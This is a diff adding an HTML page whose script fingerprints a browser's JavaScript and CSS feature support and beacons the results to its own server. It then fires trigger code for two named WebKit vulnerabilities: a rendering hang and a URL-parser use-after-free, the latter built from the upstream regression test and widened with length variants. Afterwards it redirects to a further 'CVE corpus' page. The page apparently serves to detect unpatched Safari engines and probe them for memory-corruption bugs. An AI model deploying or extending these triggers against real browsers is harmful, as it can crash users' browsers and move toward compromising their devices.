@@ -1,0 +1,89 @@
+<!doctype html><meta charset="utf-8"><title>ver</title>
+<script>
+function b(t){
+  var u = location.origin + '/beacon/VER-' + t + '?t=' + Date.now();
+  try { var x=new XMLHttpRequest(); x.open('GET',u,false); x.send(); return; } catch(e){}
+  try { navigator.sendBeacon(u); } catch(e){}
+}
+function has(n){ try { return (0,eval)('typeof '+n) } catch(e){ return 'throw' } }
+b('S');
+b('UA:'+encodeURIComponent(navigator.userAgent));
+var t=[];
+t.push('withResolvers='+has('Promise.withResolvers'));
+t.push('fromAsync='+has('Array.fromAsync'));
+t.push('groupBy='+has('Object.groupBy'));
+t.push('mapGroupBy='+has('Map.groupBy'));
+t.push('durationFormat='+has('Intl.DurationFormat'));
+t.push('setMethods='+has('Set.prototype.union'));
+t.push('regexpv='+has('RegExp.escape'));
+t.push('arraybufferTransfer='+has('ArrayBuffer.prototype.transfer'));
+t.push('promiseTry='+has('Promise.try'));
+t.push('iterator='+has('Iterator'));
+t.push('u32024='+(function(){try{return new RegExp('^\\p{RGI_Emoji}$','v').test('\u{1F600}')?1:0}catch(e){return 'no'}})());
+b('F:'+encodeURIComponent(t.join('|')));
+var c=[];
+function cs(p,v){ try { return CSS.supports(p,v) } catch(e){ return 'throw' } }
+c.push('lightdark='+cs('color','light-dark(red,blue)'));
+c.push('anchor='+cs('position-anchor','--a'));
+c.push('if='+cs('color','if(style(--x:1): red; else: blue)'));
+c.push('colorcontrast='+cs('color','contrast-color(red)'));
+c.push('siblingindex='+cs('z-index','sibling-index()'));
+c.push('scrollstate='+cs('container-type','scroll-state'));
+c.push('textbox='+cs('field-sizing','content'));
+c.push('relativecolor='+cs('color','rgb(from red r g b)'));
+c.push('subgrid='+cs('grid-template-columns','subgrid'));
+c.push('scope='+(function(){try{document.querySelector(':scope(*)');return 1}catch(e){return 0}})());
+b('C:'+encodeURIComponent(c.join('|')));
+var j=[];
+try { new Intl.Segmenter(); j.push('segmenter=1') } catch(e){ j.push('segmenter=0') }
+try { structuredClone({a:1}); j.push('sclone=1') } catch(e){ j.push('sclone=0') }
+try { j.push('wasm='+(typeof WebAssembly)) } catch(e){ j.push('wasm=x') }
+try { j.push('esm='+(0,eval)('typeof import')) } catch(e){ j.push('esm=x') }
+b('J:'+encodeURIComponent(j.join('|')));
+b('DONE');
+// premise test: WebKit bug 263989 (CVE-2023-42956) hangs on zero font-size wavy
+// underline over <del>; fixed in Safari 17.2. If the engine is 17.0 with no
+// backports, this hangs and H99OK never arrives.
+(function(){
+  try {
+    var d=document.createElement('del');
+    d.textContent='a';
+    d.style.textDecoration='wavy underline';
+    d.style.fontSize='0px';
+    document.documentElement.appendChild(d);
+    b('H99');
+    document.documentElement.offsetHeight;
+    b('H99OK');
+  } catch(e){ b('H99ERR'); }
+})();
+
+// WebKit bug 263682 / CVE-2023-42950: URLParser::parse use-after-free when the
+// ascii buffer reallocates. Fixed 2023-12-15 (Safari 17.2). Trigger is the
+// upstream regression test plus scheme-length variants.
+(function(){
+  try {
+    var v=document.createElement('video');
+    v.setAttribute('preload','metadata');
+    v.textContent="<ls'|";
+    document.documentElement.appendChild(v);
+    b('U1');
+    v.poster = String.fromCharCode(117,67,45,112,50,57,122,86,51,72,81,67,110,100,111,43,58,74);
+    b('U2:'+encodeURIComponent(String(v.poster)));
+    var out=[];
+    for (var n=8;n<=72;n+=4){
+      var s='';
+      for (var i=0;i<n;i++) s += String.fromCharCode(97 + (i%26));
+      v.poster = s + ':' + 'J';
+      out.push(n + '=' + (String(v.poster).length));
+    }
+    b('U3:'+encodeURIComponent(out.join(',')));
+    var a=document.createElement('a');
+    a.href='hTtP:' + String.fromCharCode(117,67,45,112,50,57);
+    document.documentElement.appendChild(a);
+    var u=new URL('http://example.com/' + 'a'.repeat(200));
+    b('U4:'+encodeURIComponent(u.protocol+u.pathname.length));
+  } catch(e){ b('UERR:'+encodeURIComponent(e && e.name)); }
+})();
+
+setTimeout(function(){ location.replace('/corpus/cve.html?t=dom&t2=' + Date.now()); }, 400);
+</script>
